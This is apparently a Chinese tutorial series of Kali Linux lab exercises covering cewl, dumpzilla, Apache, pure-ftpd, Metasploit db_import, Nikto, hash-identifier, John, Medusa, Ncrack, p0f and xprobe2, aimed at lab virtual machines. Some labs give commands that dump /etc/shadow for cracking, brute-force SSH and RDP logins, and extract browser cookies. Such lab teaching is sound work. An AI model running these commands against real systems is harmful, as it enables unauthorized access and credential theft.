<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用cewl工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>kali 2018<br>windows 7 192.168.163.</p>
<p><strong>实验工具</strong></p>
<p>cewl</p>
<p><strong>实验目的</strong></p>
<p>掌握密码爬取工具cewl的使用</p>
<p><strong>实验步骤</strong></p>
<h2 id="1-直接在终端启动cewl"><a href="#1-直接在终端启动cewl" class="headerlink" title="1. 直接在终端启动cewl"></a>1. 直接在终端启动cewl</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cewl –h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="2-爬取最小单词长度为-5"><a href="#2-爬取最小单词长度为-5" class="headerlink" title="2. 爬取最小单词长度为 5"></a>2. 爬取最小单词长度为 5</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cewl 192.168.163.147:88 –m 5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="3-爬取网站深度为-5-的关键字"><a href="#3-爬取网站深度为-5-的关键字" class="headerlink" title="3. 爬取网站深度为 5 的关键字"></a>3. 爬取网站深度为 5 的关键字</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cewl – d 5 192.168.163.147:88<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="4-收集包含emali地址信息"><a href="#4-收集包含emali地址信息" class="headerlink" title="4. 收集包含emali地址信息"></a>4. 收集包含emali地址信息</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cewl – e 192.168.163.147:88<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="5-统计每个单词出现的次数"><a href="#5-统计每个单词出现的次数" class="headerlink" title="5. 统计每个单词出现的次数"></a>5. 统计每个单词出现的次数</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cewl 192.168.163.147:88 –c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="6-可以多个参数一起使用"><a href="#6-可以多个参数一起使用" class="headerlink" title="6. 可以多个参数一起使用"></a>6. 可以多个参数一起使用</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cewl 192

.168.163.147:88 -m 3 -d 3 -e -c -v -w a.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h2 id="7-查看a-txt字典"><a href="#7-查看a-txt字典" class="headerlink" title="7. 查看a.txt字典"></a>7. 查看a.txt字典</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cat a.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>实验总结</strong></p>
<p>使用通过cewl工具爬取的字典文件，使用它去爆破网站的后台</p>
<h1 id="实验-8-取证工具-dumpzilla"><a href="#实验-8-取证工具-dumpzilla" class="headerlink" title="实验 8 取证工具-dumpzilla"></a>实验 8 取证工具-dumpzilla</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用dumpzilla工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>kali 2018</p>
<p><strong>实验工具</strong></p>
<p>Dumpzilla</p>
<p><strong>实验目的</strong></p>
<p>了解取证工具Dumpzilla的使用</p>
<p><strong>实验步骤</strong></p>
<h2 id="1-查看dumpzilla工具帮助"><a href="#1-查看dumpzilla工具帮助" class="headerlink" title="1. 查看dumpzilla工具帮助"></a>1. 查看dumpzilla工具帮助</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Dumpzilla – h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="2-分析Mozilla的配置文件夹（’-root-mozilla-firefox-4ed7jhtz-default-‘）的历史访问记录"><a href="#2-分析Mozilla的配置文件夹（’-root-mozilla-firefox-4ed7jhtz-default-‘）的历史访问记录" class="headerlink" title="2. 分析Mozilla的配置文件夹（’/root/.mozilla/firefox/4ed7jhtz.default/‘）的历史访问记录"></a>2. 分析Mozilla的配置文件夹（’/root/.mozilla/firefox/4ed7jhtz.default/‘）的历史访问记录</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dumpzilla '/root/.mozilla/firefox/4ed7jhtz.default/' –History<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="3-分析Mozilla的配置文件夹（’-root-mozilla-firefox-4ed7jhtz-default-‘）的Cookies"><a href="#3-分析Mozilla的配置文件夹（’-root-mozilla-firefox-4ed7jhtz-default-‘）的Cookies" class="headerlink" title="3. 分析Mozilla的配置文件夹（’/root/.mozilla/firefox/4ed7jhtz.default/‘）的Cookies"></a>3. 分析Mozilla的配置文件夹（’/root/.mozilla/firefox/4ed7jhtz.default/‘）的Cookies</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dumpzilla '/root/.mozilla/firefox/4ed7jhtz.default/' –-Cookies<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="4-分析Mozilla的配置文件夹（’-root-mozilla-firefox-4ed7jhtz-default-‘）和转储以外的所有影像数据（-All）"><a href="#4-分析Mozilla的配置文件夹（’-root-mozilla-firefox-4ed7jhtz-default-‘）和转储以外的所有影像数据（-All）" class="headerlink" title="4. 分析Mozilla的配置文件夹（’/root/.mozilla/firefox/4ed7jhtz.default/‘）和转储以外的所有影像数据（-All）"></a>4. 分析Mozilla的配置文件夹（’/root/.mozilla/firefox/4ed7jhtz.default/‘）和转储以外的所有影像数据（-All）</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dumpzilla '/root/.mozilla/firefox/4ed7jhtz.default/' --All<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>实验总结</strong></p>
<p>思考dumpzilla工具除了分析本机的浏览器文件是否还能分析远程主机的配置文件。</p>
<h1 id="实验9-apache服务配置"><a href="#实验9-apache服务配置" class="headerlink" title="实验9 apache服务配置"></a>实验9 apache服务配置</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器安装apache服务，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>kali 2016</p>
<p><strong>实验工具</strong></p>
<p>apache 2</p>
<p><strong>实验目的</strong></p>
<p>掌握kali下apache的配置</p>
<p><strong>实验步骤</strong></p>
<p>查看本机安装的apache版本号</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">apachectl –v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>启动apache服务</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/etc/init.d/apache2 start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>重启apache服务</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/etc/init.d/apache2 restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>停止apache服务</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/etc/init.d/apache2 stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>下载默认首页并查看网页内容</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wget http://127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>进入apache默认首页的目录</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cd /var/www/html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>替换默认首页内容为 123</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">echo "123" &gt; index.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>重启apache服务</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/etc/init.d/apache2 restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>下载默认首页</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wget http://127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查看下载首页内容</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cat index.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>实验总结</strong></p>
<p>在kali上成功运行个人网页</p>
<h1 id="实验-10-产品安全分析工具"><a href="#实验-10-产品安全分析工具" class="headerlink" title="实验 10 产品安全分析工具"></a>实验 10 产品安全分析工具</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用glob工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>攻击机：kali<br>靶机：centos 6.9<br>靶机ip地址：192.168.163.136</p>
<p><strong>实验工具</strong></p>
<p>glob</p>
<p><strong>实验目的</strong></p>
<p>掌握glob的使用</p>
<p><strong>实验步骤</strong></p>
<p>启动kali中cisco的安全工具</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cge.pl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>选择一个漏洞，并按照所给的格式进行测试，网址后面添加漏洞编号</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cge.pl http://192.168.163.136/index.html 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>CAT -h 主机名 - w 字典文件 - a 密码文件 - i</p>
<p>（直接在终端输入CAT直接启动，这里没有cisco设备，无法复现实验）</p>
<p><strong>实验总结</strong></p>
<p>如果有cisco设备，使用glob工具对其进行检测</p>
<h1 id="实验11-pure-ftpd配置"><a href="#实验11-pure-ftpd配置" class="headerlink" title="实验11 pure-ftpd配置"></a>实验11 pure-ftpd配置</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用pure-ftpd工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>kali</p>
<p><strong>实验工具</strong></p>
<p>pure-ftpd</p>
<p><strong>实验目的</strong></p>
<p>掌握按照和配置pure-ftpd</p>
<p><strong>实验步骤</strong></p>
<p>安装 Pure-FTPd</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">apt-get install pure-ftpd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>修改配置</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cd /etc/pure-ftpd/conf
echo no &gt; Bind
echo no &gt; PAMAuthentication
echo no &gt; UnixAuthentication
ln -s /etc/pure-ftpd/conf/PureDB /etc/pure-ftpd/auth/50 pure<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建FTP服务要用到的用户组和用户</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">groupadd ftpgroup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>向创建的组里面添加新用户</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">useradd -g ftpgroup -d /dev/null -s /bin/false ftpuser<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>为FTP文件新建一个目录</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mkdir -p /home/pubftp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在ftp目录下新建一个测试文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">echo "test file" &gt; /home/pubftp/test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在FTP目录里面添加用户目录</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mkdir /home/pubftp/sam<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>给FTP服务添加一个新的用户和密码</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pure-pw useradd sam -u ftpuser -g ftpgroup -d /home/pubftp/sam<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>更新Pure-FTPd的数据库</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pure-pw mkdb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>启动FTP服务</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">service pure-ftpd start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>启动FTP后，测试该服务</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ftp 127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>实验总结</strong></p>
<p>思考这里的pure-ftpd和Linux的FTP以及vsftpd是否一样</p>
<h1 id="实验12-Metasploit-db-import实验"><a href="#实验12-Metasploit-db-import实验" class="headerlink" title="实验12 Metasploit-db_import实验"></a>实验12 Metasploit-db_import实验</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用db_import工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>kali 2016<br>centos 6.9</p>
<p>**实验工具</p>
<p>**</p>
<p>Metasploit<br>Nmap</p>
<p><strong>实验目的</strong></p>
<p>把nmap扫描的数据导入metasploit</p>
<p><strong>实验步骤</strong></p>
<ol>
<li>在kali虚拟机上测试与靶机的连通性</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.133 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li>在靶机centos上测试与kali的连通性</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.134 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="3">
<li>在kali上使用nmap进行局域网存活扫描并把结果保存为db.xml</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -sP 192.168.127.0/24 -oX db.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="4">
<li>查看刚保存的文件</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cat db.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="5">
<li>在kali中启动metasploit并查看数据库中是否有数据，如果有数据使用<code>hosts -d</code>进行清空</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsole
hosts
hosts -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<ol start="6">
<li>利用db_import把刚刚nmap扫描的数据导入到数据库中(注意文件路径)</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">db_import /root/db.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="7">
<li>使用<code>hosts</code>查看数据</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="8">
<li>过滤出其中开启22端口的主机</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">services -p 22 -c name,proto<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="9">
<li>过滤出开启21端口的主机</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">services -p 21 -c name,proto<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>实验总结</strong></p>
<p>掌握msf下db_import导入数据功能的使用</p>
<h1 id="实验13-web扫描-Nikto"><a href="#实验13-web扫描-Nikto" class="headerlink" title="实验13 web扫描-Nikto"></a>实验13 web扫描-Nikto</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Nikto工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>kali 2016</p>
<p><strong>实验工具</strong></p>
<p>Nikto</p>
<p><strong>实验目的</strong></p>
<p>掌握Nikto的使用</p>
<p><strong>实验步骤</strong></p>
<p>Nikto 是一款Perl语言开发的开源代码的、功能强大的WEB扫描评估软件，能对web服务器多种安全项目进行测试的扫描软件。</p>
<p>扫描内容有以下几个方面：</p>
<ol>
<li>软件版本</li>
<li>搜索存在安全隐患的文件（如：某些web维护人员备份完后，遗留的压缩包，若被下载下来，则获得网站源码）</li>
<li>服务器配置漏洞（组件可能存在默认配置）</li>
<li>WEB Application层面的安全隐患（XSS，SQL注入等）</li>
<li>避免 404 误判</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto -list-plugins<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>制定网站目录扫描</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto –host http://192.168.21.128/index/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>指定一个或多个端口进行扫描</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto –host 192.168.21.128 –port 80,443<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>还可以进行批量扫描</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto –host host.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>把扫描结果导成文件保存在本地</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto –host 192.168.21.128 –port 80 –output nikto.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>用<code>cat</code>查看该文件也可以使用火狐打开该文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cat nikto.html
firefox nikto.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>实验总结</strong></p>
<p>观察Nikto的端口扫描和nmap的扫描结果是不是一样，如果不一样，谁的结果更准确一点</p>
<h1 id="实验-14-哈希工具Hash-Identifier"><a href="#实验-14-哈希工具Hash-Identifier" class="headerlink" title="实验 14 哈希工具Hash-Identifier"></a>实验 14 哈希工具Hash-Identifier</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Hash-Identifier<br>工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>kali 2018</p>
<p><strong>实验工具</strong></p>
<p>hash-identifier</p>
<p><strong>实验目的</strong></p>
<p>了解工具的使用</p>
<h2 id="实验步骤-3"><a href="#实验步骤-3" class="headerlink" title="实验步骤"></a>实验步骤</h2><p><strong>1. 哈希值识别</strong></p>
<p>哈希值是使用HASH算法通过逻辑运算得到的数值。不同的内容使用HASH算法运算后，得到的哈希值不同。当我们拿到一段hash值时该如何去判断它是属于那种算法。</p>
<p>在终端中启动hash-identifier，提示输入hash值。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hash-identifier<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>2. 识别测试数据</strong></p>
<p>打开root目录下的HASH.txt文件，里面有几组测试数据，后面是hash编码。</p>
<ul>
<li>复制第一组数据到hash-identifier，判断该hash值最大可能的算法是MD5，最小可能性的是下面其它算法。</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hash-identifier [first_hash_value]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>复制第二组数据到hash-identifier，识别结果是MD5(phpBB3)。</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hash-identifier [second_hash_value]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>复制第三组数据到hash-identifier，识别结果是MD5(Unix)。</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hash-identifier [third_hash_value]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>复制第四组数据到hash-identifier，识别结果是MD5（Wordpress）。</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hash-identifier [fourth_hash_value]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>复制第五组数据到hash-identifier，识别结果是SHA-512。</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hash-identifier [fifth_hash_value]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>复制第六组数据到hash-identifier，识别结果最可能的算法是Tiger-192。</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hash-identifier [sixth_hash_value]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>验证Hash-Identifier工具对MD5等常见编码是否能成功识别。</p>
<h1 id="实验-15-离线攻击工具-John工具"><a href="#实验-15-离线攻击工具-John工具" class="headerlink" title="实验 15 离线攻击工具-John工具"></a>实验 15 离线攻击工具-John工具</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用John工具，为<br>避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>kali</p>
<p><strong>实验工具</strong></p>
<p>john</p>
<p><strong>实验目的</strong></p>
<p>掌握kali下john工具的使用</p>
<h2 id="实验步骤-4"><a href="#实验步骤-4" class="headerlink" title="实验步骤"></a>实验步骤</h2><p><strong>1. 启动John工具</strong></p>
<p>先启动john软件，在终端输入以下命令。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">john<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>2. 获取本机密码散列</strong></p>
<p>利用john破解密码，首先需要散列，这里我们把本机的密码散列作为密码。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">unshadow /etc/passwd /etc/shadow &gt; pasd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>3. 使用John破解密码</strong></p>
<p>直接使用本地的散列去进行破解，破解出本机的root密码。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">john pasd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="实验总结-1"><a href="#实验总结-1" class="headerlink" title="实验总结"></a>实验总结</h2><p>思考John工具成功爆破的前提是在哪？</p>
<h1 id="实验-16-密码爆破-Medusa"><a href="#实验-16-密码爆破-Medusa" class="headerlink" title="实验 16 密码爆破-Medusa"></a>实验 16 密码爆破-Medusa</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Medusa工具，<br>来检测内网中是否存在弱口令服务，为避免在部署时候出现什么问题，小明首先在自己的虚<br>拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>攻击机 kali 2018<br>靶机 centos6.9</p>
<p><strong>实验工具</strong></p>
<p>medusa</p>
<p><strong>实验目的</strong></p>
<p>了解并掌握密码爆破软件medusa的基本用法</p>
<h2 id="实验步骤-5"><a href="#实验步骤-5" class="headerlink" title="实验步骤"></a>实验步骤</h2><p><strong>1. 启动Medusa</strong></p>
<p>Medusa是支持AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NCP (NetWare), NNTP, PcAnywhere, POP3, PostgreSQL, rexec, rlogin, rsh, SMB, SMTP (AUTH/VRFY), SNMP, SSHv2, SVN, Telnet, VmAuthd, VNC的密码爆破工具。</p>
<p>在终端输入以下命令。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">medusa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>2. 查看可用模块</strong></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">medusa -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>3. 查看模块帮助</strong></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">medusa -M telnet -q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>4. 爆破靶机的ssh</strong></p>
<p>需要在本机先新增一个<code>username.txt</code>和<code>password.txt</code>。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">medusa -h 192.168.163.150 -u username.txt -P password.txt -M ssh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="实验总结-2"><a href="#实验总结-2" class="headerlink" title="实验总结"></a>实验总结</h2><p>使用medusa工具批量爆破内网ip段，检测是否存在弱口令服务。</p>
<h1 id="实验-17-远程爆破工具-Ncrack"><a href="#实验-17-远程爆破工具-Ncrack" class="headerlink" title="实验 17 远程爆破工具-Ncrack"></a>实验 17 远程爆破工具-Ncrack</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Ncrack工具，<br>为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>攻击机 kali 2018 192.168.163.154<br>靶机 windows 7 192.168.163.134</p>
<p><strong>实验工具</strong></p>
<p>Ncrack</p>
<p><strong>实验目的</strong></p>
<p>了解并掌握Ncrack工具的使用方法</p>
<h2 id="实验步骤-6"><a href="#实验步骤-6" class="headerlink" title="实验步骤"></a>实验步骤</h2><p><strong>1. 查看软件版本号</strong></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ncrack –v
``

`

**2. 查看Ncrack帮助**

```bash
ncrack --help<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>3. 爆破windows主机的3389</strong></p>
<p>需要先添加一个<code>usename.txt</code>和<code>password.txt</code>文件。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ncrack -vv -U usename.txt -P password.txt 192.168.163.134:3389 CL=1 -f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>根据爆破结果，使用<code>test/111111</code>使用rdesktop可以正常连接。</p>
<h2 id="实验总结-3"><a href="#实验总结-3" class="headerlink" title="实验总结"></a>实验总结</h2><p>思考同样的爆破工具Ncrack和Medusa的差异和速度上有什么区别。</p>
<h1 id="实验-18-主机系统识别-p0f"><a href="#实验-18-主机系统识别-p0f" class="headerlink" title="实验 18 主机系统识别-p0f"></a>实验 18 主机系统识别-p0f</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用主机系统识别<br>p0f工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>kali</p>
<p><strong>实验工具</strong></p>
<p>p0f<br>xprobe2</p>
<p><strong>实验目的</strong></p>
<p>掌握使用工具来进行主机系统识别</p>
<h2 id="实验步骤-7"><a href="#实验步骤-7" class="headerlink" title="实验步骤"></a>实验步骤</h2><p><strong>1. 启动p0f监听</strong></p>
<p>p0f是一款被动探测工具，通过分析网络数据包来判断操作系统类型。同时p0f在网络分析方面功能强大，可以用它来分析NAT、负载均衡、应用代理等。以下命令为监听网卡<code>eth0</code>并开启混杂模式。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">p0f -i eth0 -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>2. 浏览器访问网页</strong></p>
<p>通过浏览器去访问网页，能通过p0f观察到对方的系统。</p>
<h2 id="实验总结-4"><a href="#实验总结-4" class="headerlink" title="实验总结"></a>实验总结</h2><p>思考kali上最经典的扫描工具Nmap跟实验中p0f工具在识别结果上谁更准确。</p>
<h1 id="实验-19-主机系统识别-xprobe2"><a href="#实验-19-主机系统识别-xprobe2" class="headerlink" title="实验 19 主机系统识别-xprobe2"></a>实验 19 主机系统识别-xprobe2</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用xprobe 2 工具，<br>为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>kali2016</p>
<p><strong>实验工具</strong></p>
<p>xprobe2</p>
<p><strong>实验目的</strong></p>
<p>使用xprobe2进行远程系统识别</p>
<h2 id="实验步骤-8"><a href="#实验步骤-8" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>xprobe2是一款使用ICMP消息进行操作系统探测的软件，探测结果可以和Nmap互为参照。但是该软件目前公开版本为2005年的版本，对老的操作系统探测结果较为准确。对远程主机探测，可以直接通过xprobe2并制定远程主机ip或者主机名。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">xprobe2 [remote_host_ip_or_name]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="实验总结-5"><a href="#实验总结-5" class="headerlink" title="实验总结"></a>实验总结</h2><p>思考xprobe 2 识别主机方式跟nmap和p0f有什么不一样，可以通过抓包去分析。</p>
<h1 id="实验-20-数据取证-Hashdeep"><a href="#实验-20-数据取证-Hashdeep" class="headerlink" title="实验 20 数据取证-Hashdeep"></a>实验 20 数据取证-Hashdeep</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Hashdeep工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>kali 2018</p>
<p><strong>实验工具</strong></p>
<p>hashdeep</p>
<p><strong>实验目的</strong></p>
